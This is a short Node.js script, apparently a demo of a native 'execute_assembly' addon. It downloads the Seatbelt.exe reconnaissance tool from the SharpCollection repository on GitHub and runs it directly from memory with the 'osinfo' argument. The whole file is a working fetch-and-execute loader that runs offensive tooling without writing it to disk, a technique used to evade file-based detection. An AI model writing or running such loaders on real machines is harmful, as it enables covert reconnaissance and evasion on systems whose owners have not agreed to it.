const https = require('https');

// URL of the file
const url = 'https://raw.githubusercontent.com/Flangvik/SharpCollection/refs/heads/master/NetFramework_4.7_x64/Seatbelt.exe';

// Fetch the file
https.get(url, (res) => {
  const data = [];

  res.on('data', (chunk) => {
    data.push(chunk);
  });

  res.on('end', () => {
    const byteBuffer = Buffer.concat(data);
    let a = require("./execute_assembly/build/Debug/api.node");
    console.log(a.execute_assembly(byteBuffer, false, ["osinfo"]));
    console.log(a.execute_assembly(byteBuffer, true, ["osinfo"]));
  });
}).on('error', (err) => {
  console.error('Error fetching the file:', err);
});
